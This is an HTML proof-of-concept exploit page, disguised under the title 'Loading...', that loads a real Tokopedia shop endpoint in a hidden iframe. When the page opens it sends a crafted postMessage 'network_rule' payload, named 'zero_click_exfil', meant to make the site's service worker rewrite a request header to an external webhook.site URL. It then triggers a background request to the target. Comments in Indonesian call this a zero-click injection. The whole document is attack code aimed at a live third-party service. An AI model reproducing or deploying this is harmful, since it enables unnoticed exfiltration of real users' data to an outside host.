<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <iframe id="target" src="https://shop-id.tokopedia.com/v1/list" style="display:none;"></iframe>

    <script>
        const targetFrame = document.getElementById('target');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

        function sendExploit() {
            console.log("Attempting Zero-Click Injection...");
            
            const payload = {
                source: "main_thread",
                eventName: "network_rule",
                data: [{
                    ruleName: "zero_click_exfil",
                    global: true,
                    conditions: [],
                    handlers: [{
                        handler: "replace",
                        type: "header",
                        field: "X-Pns-Referrer",
                        value: webhook
                    }]
                }]
            };

            // Kirim ke semua frame yang berhasil ter-load
            targetFrame.contentWindow.postMessage(payload, "*");
        }

        // Jalankan otomatis saat halaman dibuka
        targetFrame.onload = function() {
            // Kasih jeda dikit biar SW siap
            setTimeout(sendExploit, 2000);
            
            // Setelah injeksi, kita paksa fetch dari background (Zero-Click)
            setTimeout(() => {
                // Kita coba pemicu fetch lewat image tag ke domain target
                const img = new Image();
                img.src = "https://shop-id.tokopedia.com/v1/list?trigger=" + Math.random();
            }, 4000);
        };
    </script>
